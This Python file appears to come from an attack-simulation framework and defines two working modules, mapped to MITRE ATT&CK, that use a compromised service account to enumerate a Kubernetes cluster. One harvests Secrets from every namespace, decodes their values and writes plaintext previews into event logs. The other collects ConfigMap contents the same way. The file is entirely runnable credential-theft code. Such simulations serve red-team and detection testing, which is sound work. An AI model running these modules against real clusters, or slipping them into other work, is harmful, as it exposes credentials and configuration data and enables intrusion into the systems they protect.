import asyncio
import base64
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class SecretsExfiltration(BaseAttack):
    @property
    def name(self):
        return "Kubernetes Secrets Exfiltration"

    @property
    def description(self):
        return "Enumerates and extracts all secrets across namespaces via the Kubernetes API using a compromised service account."

    @property
    def severity(self):
        return AttackSeverity.CRITICAL

    @property
    def mitre_tactic(self):
        return "credential_access"

    @property
    def mitre_techniques(self):
        return [{"id": "T1552.007", "name": "Container Secrets"}, {"id": "T1613", "name": "Access K8s API"}]

    def _log_k8s_output(self, items, namespace="", kind="resource"):
        """Format k8s list output as kubectl-style string for cmd_event_sync."""
        lines = []
        for item in items:
            name = item.metadata.name
            lines.append(f"{name}")
        return "\n".join(lines)

    async def execute(self):
        api = self._get_core_api()

        self.emit_event_sync("info", "Starting secrets enumeration across all namespaces", {})

        try:
            namespaces = api.list_namespace()
            ns_list = [ns.metadata.name for ns in namespaces.items]
            ns_output = "\n".join(ns_list)
            self.cmd_event_sync(
                "kubectl get namespaces -o name",
                ns_output,
                "Enumerated all namespaces via Kubernetes API"
            )
            self.emit_event_sync("info", f"Discovered {len(ns_list)} namespaces", {
                "namespaces": ns_list,
            })

            total_secrets = 0
            for ns in ns_list:
                try:
                    secrets = api.list_namespaced_secret(ns)
                    secret_names = [s.metadata.name for s in secrets.items]
                    if secret_names:
                        cmd_output = "\n".join(secret_names)
                        self.cmd_event_sync(
                            f"kubectl get secrets -n {ns}",
                            cmd_output,
                            f"Listed {len(secret_names)} secrets in namespace {ns}"
                        )

                    for secret in secrets.items:
                        total_secrets += 1
                        secret_data = {}
                        if secret.data:
                            for key, value in secret.data.items():
                                try:
                                    decoded = base64.b64decode(value).decode()
                                    secret_data[key] = decoded[:50] + "..." if len(decoded) > 50 else decoded
                                except Exception:
                                    secret_data[key] = f"<binary: {len(value)} bytes>"

                        # Log the raw secret data as kubectl output
                        yaml_lines = [f"apiVersion: v1", f"kind: Secret", f"metadata:", f"  name: {secret.metadata.name}", f"  namespace: {ns}", f"type: {secret.type}", f"data:"]
                        if secret.data:
                            for k in secret.data.keys():
                                yaml_lines.append(f"  {k}: <base64-encoded>")
                        self.cmd_event_sync(
                            f"kubectl get secret {secret.metadata.name} -n {ns} -o yaml",
                            "\n".join(yaml_lines),
                            f"Extracted secret: {secret.metadata.name}"
                        )

                        self.emit_event_sync("success", f"Extracted secret: {secret.metadata.name} in namespace {ns}", {
                            "secret_name": secret.metadata.name,
                            "namespace": ns,
                            "keys": list(secret.data.keys()) if secret.data else [],
                            "data_preview": secret_data,
                            "type": secret.type,
                        })
                        self.add_infrastructure_sync("secret", secret.metadata.name, ns, {
                            "type": secret.type,
                            "key_count": len(secret.data) if secret.data else 0,
                            "keys": list(secret.data.keys()) if secret.data else [],
                        })
                except ApiException as e:
                    if e.status == 403:
                        self.emit_event_sync("warning", f"Access denied to namespace {ns} - RBAC restricted", {
                            "namespace": ns,
                        })
                    else:
                        self.emit_event_sync("error", f"Error listing secrets in {ns}: {e}", {})

            self.emit_event_sync("complete", f"Secrets enumeration completed. Extracted {total_secrets} secrets.", {
                "total_secrets": total_secrets,
                "namespaces_examined": len(ns_list),
            })

        except ApiException as e:
            self.emit_event_sync("error", f"Failed to list namespaces: {e}", {})
            raise


class ConfigMapExfiltration(BaseAttack):
    @property
    def name(self):
        return "ConfigMap Data Collection"

    @property
    def description(self):
        return "Extracts all ConfigMaps across namespaces to collect configuration data, credentials, and application settings."

    @property
    def severity(self):
        return AttackSeverity.MEDIUM

    @property
    def mitre_tactic(self):
        return "collection"

    @property
    def mitre_techniques(self):
        return [{"id": "T1113", "name": "Screen Capture / Data from ConfigMap"}, {"id": "T1613", "name": "Access K8s API"}]

    async def execute(self):
        api = self._get_core_api()

        self.emit_event_sync("info", "Starting ConfigMap enumeration across all namespaces", {})

        try:
            namespaces = api.list_namespace()
            total_configmaps = 0

            for ns in [ns.metadata.name for ns in namespaces.items]:
                try:
                    configmaps = api.list_namespaced_config_map(ns)
                    cm_names = [cm.metadata.name for cm in configmaps.items]
                    if cm_names:
                        cmd_output = "\n".join(cm_names)
                        self.cmd_event_sync(
                            f"kubectl get configmaps -n {ns}",
                            cmd_output,
                            f"Listed {len(cm_names)} ConfigMaps in namespace {ns}"
                        )

                    for cm in configmaps.items:
                        total_configmaps += 1
                        data_preview = {}
                        if cm.data:
                            for key, value in cm.data.items():
                                data_preview[key] = value[:80] + "..." if len(value) > 80 else value

                        yaml_lines = [f"apiVersion: v1", f"kind: ConfigMap", f"metadata:", f"  name: {cm.metadata.name}", f"  namespace: {ns}", f"data:"]
                        if cm.data:
                            for k, v in cm.data.items():
                                preview = v[:60] + "..." if len(v) > 60 else v
                                yaml_lines.append(f"  {k}: |")
                                yaml_lines.append(f"    {preview}")
                        self.cmd_event_sync(
                            f"kubectl get configmap {cm.metadata.name} -n {ns} -o yaml",
                            "\n".join(yaml_lines),
                            f"Extracted ConfigMap: {cm.metadata.name}"
                        )

                        self.emit_event_sync("success", f"Extracted ConfigMap: {cm.metadata.name} from {ns}", {
                            "configmap_name": cm.metadata.name,
                            "namespace": ns,
                            "keys": list(cm.data.keys()) if cm.data else [],
                            "data_preview": data_preview,
                        })
                        self.add_infrastructure_sync("configmap", cm.metadata.name, ns, {
                            "key_count": len(cm.data) if cm.data else 0,
                            "keys": list(cm.data.keys()) if cm.data else [],
                        })
                except ApiException as e:
                    if e.status == 403:
                        self.emit_event_sync("warning", f"Access denied to ConfigMaps in {ns}", {})

            self.emit_event_sync("complete", f"ConfigMap enumeration complete. Extracted {total_configmaps} ConfigMaps.", {
                "total": total_configmaps,
            })

        except ApiException as e:
            self.emit_event_sync("error", f"API error during ConfigMap enumeration: {e}", {})
            raise
